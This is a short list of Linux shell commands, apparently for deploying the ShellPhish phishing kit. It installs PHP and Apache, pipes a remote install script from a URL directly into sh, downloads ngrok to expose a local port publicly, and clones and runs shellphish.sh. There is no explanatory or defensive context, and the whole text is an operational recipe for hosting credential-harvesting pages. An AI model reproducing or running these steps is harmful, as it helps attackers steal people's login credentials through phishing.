sudo apt-get update
sudo apt-get install git-all
sh -c "$(curl -fsSL https://raw.githubusercontent.com/Linuxbrew/install/master/install.sh)"
sudo apt-get install php libapache2-mod-php php-mcrypt php-mysql
wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip
sudo apt-get install unzip
unzip ngrok-stable-linux-amd64.zip
./ngrok http 5555
git clone https://github.com/jayhill365/ShellPhish.git
cd ShellPhish && chmod +x * && bash shellphish.sh
